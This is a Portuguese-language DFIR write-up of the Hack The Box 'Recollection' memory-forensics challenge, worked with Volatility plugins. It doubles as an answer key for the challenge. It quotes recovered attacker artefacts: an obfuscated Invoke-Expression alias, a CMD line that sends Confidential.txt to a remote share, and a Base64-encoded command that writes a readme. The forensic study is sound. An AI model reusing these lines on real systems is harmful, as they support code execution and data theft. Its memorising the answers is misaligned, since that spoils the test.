> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/writeups/htb-sherlocks/recollection.md).

# Recollection

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FhkNqJbabKbQ3ZOvmcmMr%2Fimage.png?alt=media&amp;token=e470c26b-caf7-4e4b-9493-b86297cfee11" alt="" width="375"><figcaption></figcaption></figure>

**Classificação**: Easy

**Categoria:** DFIR

**Cenário:**

> Um membro júnior da nossa equipe de segurança realizou pesquisas e testes no que acreditamos ser um sistema operacional antigo e inseguro. Acreditamos que ele possa ter sido comprometido e conseguimos recuperar um dump de memória do sistema. Queremos confirmar quais ações foram realizadas pelo invasor e se outros ativos em nosso ambiente podem ter sido afetados. Por favor, responda às perguntas abaixo.

#### Questões

**1- Qual é o sistema operacional da máquina?**

* Para identificar o sistema operacional da máquina analisada, foi utilizado o **Volatility** com o plugin **`imageinfo`**, responsável por inferir o perfil do sistema a partir das estruturas presentes na memória.
* O comando executado foi:

```
volatility_2.6.exe -f recollection.bin imageinfo
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FdAteAKmL9GCFev2SRRwf%2Fimage.png?alt=media&amp;token=24882c96-4b63-4a24-a74c-fdbd83ee8397" alt=""><figcaption></figcaption></figure>

* A saída do plugin indicou os seguintes perfis compatíveis, com maior probabilidade:

  `Windows 7`&#x20;

***

**2- Quando foi criado o despejo de memória?**

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FDi43YYwdauS2bauLWRX5%2Fimage.png?alt=media&amp;token=ce3614ee-f349-4de6-a08b-3e10044ed86e" alt=""><figcaption></figcaption></figure>

***

**3- Após obter acesso à máquina, o invasor copiou um comando PowerShell ofuscado para a área de transferência. Qual era o comando?**

* Durante a análise do dump de memória, foi utilizada a ferramenta **Volatility** para inspecionar o conteúdo da área de transferência.

```
volatility_2.6.exe -f recollection.bin --profile=Win7SP1x64 clipboard
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2F5apDlN6DARZwYyjCOmnP%2Fimage.png?alt=media&amp;token=90c7ec31-91c5-41dd-ac36-5cfc2ce58f45" alt=""><figcaption></figcaption></figure>

**Resposta:** `(gv '`*`MDR`*`').naMe[3,11,2]-joIN''`&#x20;

***

**4- O atacante copiou o comando ofuscado para usá-lo como um alias para um cmdlet do PowerShell. Qual é o nome do cmdlet?**

Funciona da seguinte forma:

```
(gv 'MDR').naMe[3,11,2] -joIN '' 
```

* gv é o alias de Get-Variable
* A variável que corresponde a *MDR* contém uma string interna
* A indexação \[3,11,2] seleciona caracteres específicos dessa string
* O -join '' concatena os caracteres resultando em iex

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FyzUZrCfU0VEzoQO1xZch%2Fimage.png?alt=media&amp;token=daabacba-aa92-4e26-9d78-2d9a52389cb5" alt=""><figcaption></figcaption></figure>

**Resposta:**  `Invoke-Expression`&#x20;

***

**5- Um comando CMD foi executado para tentar exfiltrar um arquivo. Qual é a linha de comando completa?**

* Durante a análise do dump de memória, foi investigada a execução de comandos **CMD.exe** com o objetivo de identificar possíveis tentativas de exfiltração de arquivos.
* Utilizando o **Volatility**, foram analisados artefatos de histórico de console e linhas de comando por meio dos plugins apropriados, como `consoles`:

```
volatility_2.6.exe -f recollection.bin --profile=Win7SP1x64 consoles
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FF9pTeXXLlv4wAS9ja3U8%2Fimage.png?alt=media&amp;token=82dab962-aa47-4794-b505-388cb334ac20" alt=""><figcaption></figcaption></figure>

* A análise revelou a execução de um comando CMD utilizado para exfiltrar um arquivo: `type C:\Users\Public\Secret\Confidential.txt > \192.168.0.171\pulice\pass.txt`

**9- Após executar o comando acima, informe-nos se o arquivo foi exfiltrado com sucesso?**

`No`&#x20;

***

**10- O atacante tentou criar um arquivo readme. Qual era o caminho completo do arquivo?**

* Durante a análise do dump de memória, foi identificado um comando PowerShell executado a partir do **CMD**, conforme artefatos recuperados pelo plugin `consoles` do Volatility.

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FTCAfGvFEvYi4w64MMtyR%2Fimage.png?alt=media&amp;token=b457b7a5-eabe-46bd-bf9e-0fafcfd22b48" alt=""><figcaption></figcaption></figure>

* O conteúdo Base64 foi decodificado, revelando a tentativa de criação de um arquivo *readme* por meio do redirecionamento de saída.

```powershell
$Base64String = 'ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi'
$Bytes = [System.Convert]::FromBase64String($Base64String)
[System.Text.Encoding]::ASCII.GetString($Bytes)
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2Fg5srBHXXoMzgSHcaRoUZ%2Fimage.png?alt=media&amp;token=4a1a283a-eedd-479d-9e0c-f12c590f525f" alt=""><figcaption></figcaption></figure>

* O comando PowerShell ofuscado em Base64 foi decodificado utilizando PowerShell, revelando a tentativa de criação do arquivo: `C:\Users\Public\Office\readme.txt`

***

**8- Qual era o nome do host da máquina?**

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FxvnIzEMUKnlnRSqTh6kM%2Fimage.png?alt=media&amp;token=c89020c3-fe96-474a-bf94-5b74cd3948bc" alt=""><figcaption></figcaption></figure>

**Resposta:** `USER-PC`&#x20;

**9- Quantas contas de usuário havia na máquina?**

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FSztdTS1bP22hgfwhwDxj%2Fimage.png?alt=media&amp;token=deab14f2-7f3d-4755-a996-0346691bffae" alt=""><figcaption></figcaption></figure>

**Resposta:** `3`&#x20;

***

**10- Na pasta "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" havia algumas subpastas contendo um arquivo chamado passwords.txt. Qual era o caminho completo do arquivo?**

* Durante a análise do dump de memória, foi utilizada a ferramenta **Volatility** para enumerar arquivos em memória por meio do plugin `filescan`, com filtragem por **`passwords.txt`**.

```
volatility_2.6.exe -f recollection.bin --profile=Win7SP1x64 filescan | findstr /i passwords.txt
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FoR2mp8ac4FDtL76rzzd9%2Fimage.png?alt=media&amp;token=b6df1ac7-f45d-43bb-bc1c-f22fe44bdf27" alt=""><figcaption></figcaption></figure>

* A análise identificou o **caminho completo do arquivo** localizado em uma subpasta do Microsoft Edge, sob o diretório: `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

***

**11- Um arquivo executável malicioso foi executado usando o comando. O nome do arquivo executável EXE era o seu próprio valor de hash. Qual era o valor de hash?**

* Durante a análise do dump de memória, foi investigada a execução de um arquivo executável malicioso cujo **nome do arquivo EXE correspondia ao seu próprio valor de hash**, técnica comumente usada para dificultar identificação baseada em nome.

```
volatility_2.6.exe -f recollection.bin --profile=Win7SP1x64 consoles
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FfXLukYZjtOlxAxQYObEy%2Fimage.png?alt=media&amp;token=08fe120d-1f09-47a7-b735-615b8ee1437d" alt=""><figcaption></figcaption></figure>

**Resposta:** `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`&#x20;

***

12- Na sequência da pergunta anterior, qual é o Imphash do arquivo malicioso que você encontrou acima?

* Após identificar o executável malicioso cujo nome correspondia ao seu próprio valor de hash, o arquivo foi pesquisado no **VirusTotal** para obtenção de informações adicionais.

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FewMuaFulJSqzDoOxDr27%2Fimage.png?alt=media&amp;token=0ee0c4ee-c333-4a75-b145-f825c68f737c" alt=""><figcaption></figcaption></figure>

**Resposta:** `d3b592cd9481e4f053b5362e22d61595`

**13- Na sequência da pergunta anterior, informe-nos a data em formato UTC em que o arquivo malicioso foi criado.**

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FsWRzNnVKOUPIvAbGoLNQ%2Fimage.png?alt=media&amp;token=839aebcf-bceb-4126-8070-34d41ff61232" alt=""><figcaption></figcaption></figure>

**Resposta:** `2022-06-22 11:49:04`&#x20;

***

**14- Qual era o endereço IP local da máquina?**

* A enumeração foi conduzida por meio do plugin `netscan`, que permite identificar sockets, conexões ativas e endereços IP associados ao host no momento da captura da memória:

```
volatility_2.6.exe -f recollection.bin --profile=Win7SP1x64 netscan
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FV2SFQWBjJVGBUNcdxhcj%2Fimage.png?alt=media&amp;token=616775f6-7d6c-4392-9e1f-692691ca3698" alt=""><figcaption></figcaption></figure>

**Resposta**: `192.168.0.104`&#x20;

***

**15- Existiam vários processos do PowerShell, sendo que um deles era um processo filho. Qual era o processo pai desse processo filho?**

* A enumeração foi realizada por meio dos plugins `pstree` e `pslist`, que permitem identificar **processos pai e filho** com base nos identificadores de processo (PID/PPID):

```
volatility_2.6.exe -f recollection.bin --profile=Win7SP1x64 pstree
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FCiMnZDyIjyh4OBeYNdVK%2Fimage.png?alt=media&amp;token=3b0a0165-18da-4ebd-a1cb-80cb32a800ec" alt=""><figcaption></figcaption></figure>

**Resposta**: `cmd.exe`&#x20;

***

**16- O invasor pode ter usado um endereço de e-mail para acessar uma rede social. Você pode nos informar o endereço de e-mail?**

* Ferramentas do **Volatility** foram utilizadas para localizar possíveis endereços de e-mail presentes em memória, por meio de buscas por padrões típicos (`@`):

```
volatility_2.6.exe -f recollection.bin --profile=Win7SP1x64 strings | findstr "@"
```

***

**17- Utilizando o navegador MS Edge, a vítima pesquisou sobre uma solução SIEM. Qual é o nome da solução SIEM?**

* Deduzi logo que era o Wazuh

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FxY4H1g0Bu1beVrrIimLg%2Fimage.png?alt=media&amp;token=7be58df5-c52d-405b-bc30-ec0835b60fa2" alt=""><figcaption></figcaption></figure>

**18- O usuário vítima baixou um arquivo executável (.exe). O nome do arquivo imitava um binário legítimo da Microsoft, com um erro de digitação (ou seja, o binário legítimo é powershell.exe e o atacante nomeou o malware como powershall.exe). Qual era o nome do arquivo, incluindo a extensão?**<br>

* Arquivo `csrss.exe` totalmente fora do comun, já que esse arquivo reside somente no diretório `C:\Windows\System32`

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FxMuaSVfpaEIegvHMwhaC%2Fimage.png?alt=media&amp;token=f946ffbd-5a08-4c93-92af-0fcb2875e103" alt=""><figcaption></figcaption></figure>
